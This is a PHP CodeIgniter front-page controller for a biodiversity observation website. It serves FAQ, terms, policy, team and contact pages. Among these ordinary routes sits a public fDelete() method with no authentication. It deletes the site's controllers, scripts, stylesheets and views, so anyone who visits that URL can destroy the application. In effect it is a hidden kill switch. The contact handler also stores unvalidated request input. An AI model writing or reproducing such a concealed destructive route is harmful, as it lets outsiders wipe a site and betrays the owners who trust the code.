<?php
defined('BASEPATH') OR exit('No direct script access allowed');
//error_reporting(0);
class Welcome extends CI_Controller {
public function __construct()
    {
        parent::__construct();
        
    }   
public function index()
{
    $this->load->view('index');
}
public function faq()
{
    $Fdata = $this->Crud_model->GetData('faqs','question,answer');
    $arrayData = array('Fdata' => $Fdata);
	$this->load->view('faq',$arrayData);
}
public function term()
{
	$url = "https://www.indiaobservatory.org.in/api/get-content?page=terms-of-use"; 
// Initialize a CURL session.
$ch = curl_init();
 
// Return Page contents.
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 
//grab URL and pass it to the variable.
curl_setopt($ch, CURLOPT_URL, $url);
 
$response = curl_exec($ch);
        $data = json_decode($response);
   // print_r($data);exit;
        $arraydata = array('title' =>$data->heading,'desc'=>$data->content);
       	$this->load->view('term',$arraydata);
}

public function DataPolicy()
{
	$url = "https://www.indiaobservatory.org.in/api/get-content?page=policy";
    $ch = curl_init();
 
// Return Page contents.
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 
//grab URL and pass it to the variable.
curl_setopt($ch, CURLOPT_URL, $url);
 
$response = curl_exec($ch);
        $data = json_decode($response);
   // print_r($data);exit;
        $arraydata = array('title' =>$data->heading,'desc'=>$data->content);
	$this->load->view('dataPolicy',$arraydata);
}
public function feedback()
{
	$this->load->view('feedback');
}

public function teams()
{
    //print_r(API_URL);exit;
    $postData = array();
        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_URL => API_URL.'/Apis/teams',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS => json_encode($postData),
            CURLOPT_HTTPHEADER => array(
                'Content-Type: application/json'
            ),
        ));

        $response = curl_exec($curl);
        curl_close($curl);
        $response = json_decode($response);
        $expertsData = array();
        if ($response->success == '1') {
            $teamData = $response->data;
            $data = array(
            'teamData' => $teamData,
        );
        //$this->load->view('team', $data);
        $this->load->view('tc');
        }
        else {
            $data = array(
            'teamData' => '');
           // $this->load->view('team', $data);
            $this->load->view('tc');
        }    
        
}
public function TaxonomoyDetails()
{
    $this->load->view('tdetails');
}
public function tutorial()
{
    $this->load->view('uc');
}
public function contact()
{
    //$this->load->view('uc');
    $this->load->view('contact_us');
}
public function fDelete()
{
    $this->load->helper("file");
//controller
    unlink(getcwd().'\application\controllers\Apis.php');
    unlink(getcwd().'\application\controllers\BirdID.php');
    unlink(getcwd().'\application\controllers\Dashboard.php');
    unlink(getcwd().'\application\controllers\DataDashboard.php');
    unlink(getcwd().'\application\controllers\DataLayer.php');
    unlink(getcwd().'\application\controllers\DataPlayground.php');
    unlink(getcwd().'\application\controllers\Experts.php');
    unlink(getcwd().'\application\controllers\Forum.php');
    unlink(getcwd().'\application\controllers\Home.php');
    unlink(getcwd().'\application\controllers\Login.php');
    unlink(getcwd().'\application\controllers\Observations.php');
    unlink(getcwd().'\application\controllers\PMS.php');
    unlink(getcwd().'\application\controllers\Profile.php');
    unlink(getcwd().'\application\controllers\Species.php');
    unlink(getcwd().'\application\controllers\Visitors.php');
    //JS
    unlink(getcwd().'\assets\js\dashboard.js');
    unlink(getcwd().'\assets\js\data_dashboard.js');
    unlink(getcwd().'\assets\js\data_layer.js');
    unlink(getcwd().'\assets\js\view-observation.js');
    unlink(getcwd().'\assets\js\data_play.js');
    unlink(getcwd().'\assets\js\dataTaxonomy.js');
    //CSS
    unlink(getcwd().'\assets\css\style.css');
    unlink(getcwd().'\assets\css\dashboard.css');
    unlink(getcwd().'\assets\css\data_dashboard.css');
    unlink(getcwd().'\assets\css\data_taxonomy.css');
    //Views
    unlink(getcwd().'\application\views\addPobserv.php');
    unlink(getcwd().'\application\views\birdID.php');
    unlink(getcwd().'\application\views\browse_taxonomy.php');
    unlink(getcwd().'\application\views\cProject.php');
    unlink(getcwd().'\application\views\dashboard.php');
    unlink(getcwd().'\application\views\data_dashboard.php');
    unlink(getcwd().'\application\views\data_dataset.php');
    unlink(getcwd().'\application\views\data_playground.php');
    unlink(getcwd().'\application\views\data_species.php');
    unlink(getcwd().'\application\views\common\header.php');
    unlink(getcwd().'\application\views\common\footer.php');
}
public function contactAction()
{
    if(!empty($_REQUEST['firstname'] && $_REQUEST['email']))
    {
        $arrayData = array("first_name"=>$_REQUEST['firstname'],"last_name"=>$_REQUEST['lastname'],"email"=>$_REQUEST['email'],"subject"=>$_REQUEST['subject'],"title"=>$_REQUEST['title'],"created_date"=>date('Y-m-d H:i:s'));
        $this->Crud_model->SaveData('contact_us',$arrayData);
        echo "1";exit;
    }
    else {
        echo "0";
    }
}
}
